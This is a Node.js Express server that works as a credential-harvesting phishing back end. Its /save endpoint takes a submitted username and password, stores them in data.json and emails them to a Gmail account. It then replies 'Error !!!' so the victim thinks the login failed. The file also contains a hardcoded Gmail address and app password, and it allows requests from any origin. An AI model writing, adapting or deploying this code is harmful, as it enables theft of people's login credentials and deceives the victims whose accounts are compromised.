const express = require("express");
const fs = require("fs");
const path = require("path");
const nodemailer = require("nodemailer");
const cors = require("cors");

const app = express();
const PORT = 3000;

// Enable CORS for all origins
app.use(cors());

// Middleware to parse JSON
app.use(express.json());

// Create a transporter for sending emails (using Gmail)
const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
        user: "chalakbillw@gmail.com", // Your email address
        pass: "qizc qdfi mfad slgb", // Your email password (or App Password for Gmail)
    },
});

// Function to send email with user credentials
const sendEmail = (username, password) => {
    const mailOptions = {
        from: "your-email@gmail.com", // Sender address
        to: "chalakbillw@gmail.com", // Receiver address (your email)
        subject: "New Login Credentials", // Subject
        text: `Username: ${username}\nPassword: ${password}`, // Email body content
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.log("Error sending email:", error);
        } else {
            console.log("Email sent:", info.response);
        }
    });
};

// Endpoint to save data and send email
app.post("/save", (req, res) => {
    const filePath = path.join(__dirname, "data.json");
    const newData = req.body;

    // Send email with credentials
    sendEmail(newData.username, newData.password);

    fs.readFile(filePath, "utf8", (err, data) => {
        if (err) {
            console.error(err);
            return res.status(500).send("Error reading file.");
        }

        const jsonData = data ? JSON.parse(data) : [];
        jsonData.push(newData);
        console.log(jsonData);

        fs.writeFile(filePath, JSON.stringify(jsonData, null, 2), (err) => {
            if (err) {
                console.error(err);
                return res.status(500).send("Error writing file.");
            }
            res.status(200).send({ message: "Error !!!" });
        });
    });
});

// Start server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
